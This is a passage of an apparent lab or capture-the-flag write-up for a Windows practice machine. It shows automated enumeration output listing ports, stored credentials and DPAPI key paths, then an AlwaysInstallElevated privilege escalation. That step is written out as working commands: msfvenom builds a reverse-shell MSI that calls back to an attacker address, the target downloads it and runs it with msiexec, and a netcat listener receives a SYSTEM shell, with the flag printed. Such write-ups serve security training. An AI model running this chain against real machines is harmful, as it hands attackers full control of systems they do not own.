  [+] Current Listening Ports
   [?] Check for services restricted from the outside 
    Proto     Local Address          Foreign Address        State
    TCP       0.0.0.0:21                                    Listening
    TCP       0.0.0.0:80                                    Listening
    TCP       0.0.0.0:135                                   Listening
    TCP       0.0.0.0:443                                   Listening
    TCP       0.0.0.0:445                                   Listening
    TCP       0.0.0.0:3306                                  Listening
    TCP       0.0.0.0:5040                                  Listening
    TCP       0.0.0.0:49664                                 Listening
    TCP       0.0.0.0:49665                                 Listening
    TCP       0.0.0.0:49666                                 Listening
    TCP       0.0.0.0:49667                                 Listening
    TCP       0.0.0.0:49668                                 Listening
    TCP       0.0.0.0:49669                                 Listening
    TCP       127.0.0.1:14147                               Listening
    TCP       192.168.106.55:139                            Listening
    TCP       [::]:21                                       Listening
    TCP       [::]:80                                       Listening
    TCP       [::]:135                                      Listening
    TCP       [::]:443                                      Listening
    TCP       [::]:445                                      Listening
    TCP       [::]:3306                                     Listening
    TCP       [::]:49664                                    Listening
    TCP       [::]:49665                                    Listening
    TCP       [::]:49666                                    Listening
    TCP       [::]:49667                                    Listening
    TCP       [::]:49668                                    Listening
    TCP       [::]:49669                                    Listening
    TCP       [::1]:14147                                   Listening
    UDP       0.0.0.0:123                                   Listening
    UDP       0.0.0.0:5050                                  Listening
    UDP       0.0.0.0:5353                                  Listening
    UDP       0.0.0.0:5355                                  Listening
    UDP       127.0.0.1:1900                                Listening
    UDP       127.0.0.1:51157                               Listening
    UDP       127.0.0.1:64913                               Listening
    UDP       192.168.106.55:137                            Listening
    UDP       192.168.106.55:138                            Listening
    UDP       192.168.106.55:1900                           Listening
    UDP       192.168.106.55:64912                          Listening
    UDP       [::]:123                                      Listening
    UDP       [::1]:1900                                    Listening
    UDP       [::1]:64911                                   Listening

  [+] Firewall Rules
   [?] Showing only DENY rules (too many ALLOW rules always) 
    Current Profiles: PUBLIC
    FirewallEnabled (Domain):    True
    FirewallEnabled (Private):    True
    FirewallEnabled (Public):    True
    DENY rules:

  [+] DNS cached --limit 70--
    Entry                                 Name                                  Data


  =========================================(Windows Credentials)=========================================

  [+] Checking Windows Vault
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
    Not Found

  [+] Checking Credential manager
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic 
    User: 02tsduhylhazebuf
    Local machine persistence
    

    [i] If any cred was found, you can use it with 'runas /savecred'

  [+] Saved RDP connections
    Not Found

  [+] Recently run commands
    a: shell:startup\1
    MRUList: ba
    b: cmd.exe\1

  [+] Checking for DPAPI Master Keys
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
    MasterKey: C:\Users\shenzi\AppData\Roaming\Microsoft\Protect\S-1-5-21-2141929748-2461147466-4258878046-1002\17799c2a-3abc-4099-b9bf-2cb9b48d1284
    Accessed: 2/15/2022 2:25:08 AM
    Modified: 5/28/2020 8:43:19 AM
   =================================================================================================

    MasterKey: C:\Users\shenzi\AppData\Roaming\Microsoft\Protect\S-1-5-21-2141929748-2461147466-4258878046-1002\338d5dde-92d9-418a-8929-1bd1b738f2a3
    Accessed: 3/9/2022 4:07:02 AM
    Modified: 9/10/2020 4:39:23 AM
   =================================================================================================

    MasterKey: C:\Users\shenzi\AppData\Roaming\Microsoft\Protect\S-1-5-21-2141929748-2461147466-4258878046-1002\3909a7d7-ae51-423e-b8f4-d13f7fe8c264
    Accessed: 3/9/2022 4:14:54 AM
    Modified: 3/9/2022 4:14:54 AM
   =================================================================================================

    MasterKey: C:\Users\shenzi\AppData\Roaming\Microsoft\Protect\S-1-5-21-2141929748-2461147466-4258878046-1002\aa28c74e-45bf-4446-94a7-7da804eabc33
    Accessed: 3/9/2022 4:07:02 AM
    Modified: 11/30/2021 2:13:45 AM
   =================================================================================================


  [+] Checking for DPAPI Credential Files
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
    CredFile: C:\Users\shenzi\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
    Description: Local Credential Data
    MasterKey: aa28c74e-45bf-4446-94a7-7da804eabc33
    Accessed: 2/15/2022 2:25:07 AM
    Modified: 11/30/2021 2:13:45 AM
    Size: 11104
   =================================================================================================

    [i] Follow the provided link for further instructions in how to decrypt the creds file

  [+] Checking for RDCMan Settings Files
   [?] Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#remote-desktop-credential-manager
    Not Found

  [+] Looking for kerberos tickets
   [?]  https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88
    Not Found

  [+] Looking for saved Wifi credentials

  [+] Looking AppCmd.exe
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe
    Not Found

  [+] Looking SSClient.exe
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#scclient-sccm
    Not Found


  ========================================(Browsers Information)========================================

  [+] Looking for Firefox DBs
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

  [+] Looking for GET credentials in Firefox history
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

  [+] Looking for Chrome DBs
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

  [+] Looking for GET credentials in Chrome history
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

  [+] Chrome bookmarks
    Not Found

  [+] Current IE tabs
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

  [+] Looking for GET credentials in IE history
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history

  [+] IE favorites
    http://go.microsoft.com/fwlink/p/?LinkId=255142


  ==============================(Interesting files and registry)==============================

  [+] Putty Sessions
    Not Found

  [+] Putty SSH Host keys
    Not Found

  [+] SSH keys in registry
   [?] If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#ssh-keys-in-registry                                                                                                                                                              
    Not Found

  [+] Cloud Credentials
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
    Not Found

  [+] Unattend Files

  [+] Looking for common SAM & SYSTEM backups

  [+] Looking for McAfee Sitelist.xml Files

  [+] Cached GPP Passwords
  [X] Exception: Could not find a part of the path 'C:\ProgramData\Microsoft\Group Policy\History'.

  [+] Looking for possible regs with creds
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#inside-the-registry
    Not Found
    Not Found
    Not Found
    Not Found

  [+] Looking for possible password files in users homes
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml

  [+] Looking inside the Recycle Bin for creds files
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
    Not Found

  [+] Searching known files that can contain creds in home
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
    C:\Users\shenzi\NTUSER.DAT

  [+] Looking for documents --limit 100--
    Not Found

  [+] Recent files --limit 70--
    Not Found

PS C:\Users\shenzi\Desktop> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

PS C:\Users\shenzi\Desktop> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

PS C:\Users\shenzi\Desktop> 
```

## Always Install Elevate


```bash
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.106 LPORT=3306  EXITFUNC -f msi -o reverse.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
Error: One or more options failed to validate: EXITFUNC.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 -m http.server 80                                                                                                                                  2 ⨯
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.106.55 - - [09/Mar/2022 08:21:03] "GET /reverse.msi HTTP/1.1" 200 -
192.168.106.55 - - [09/Mar/2022 08:27:07] "GET /reverse.msi HTTP/1.1" 200 -
192.168.106.55 - - [09/Mar/2022 08:27:18] "GET /reverse.msi HTTP/1.1" 200 -
192.168.106.55 - - [09/Mar/2022 08:27:28] "GET /reverse.msi HTTP/1.1" 200 -
192.168.106.55 - - [09/Mar/2022 08:27:35] "GET /reverse.msi HTTP/1.1" 200 -
```

```powershell
PS C:\Users\shenzi\Desktop> wget 192.168.49.106/reverse.msi -o reverse.msi
PS C:\Users\shenzi\Desktop> msiexec /quiet /qn /i C:\Users\shenzi\Desktop\reverse.msi
PS C:\Users\shenzi\Desktop> 
```

```powershell
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/wordpress_webshell_plugin]
└─$ nc -nlvp 3306                                                                                                                                                   1 ⨯
listening on [any] 3306 ...
connect to [192.168.49.106] from (UNKNOWN) [192.168.106.55] 62426
Microsoft Windows [Version 10.0.19042.1387]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system

C:\WINDOWS\system32>cd \Users\Administrator
cd \Users\Administrator

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
ffe22f2680c5853a9e6dd7b91fa0283b

C:\Users\Administrator\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.106.55
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.106.254

C:\Users\Administrator\Desktop>
```

![](Pasted%20image%2020220309213118.png)
# Others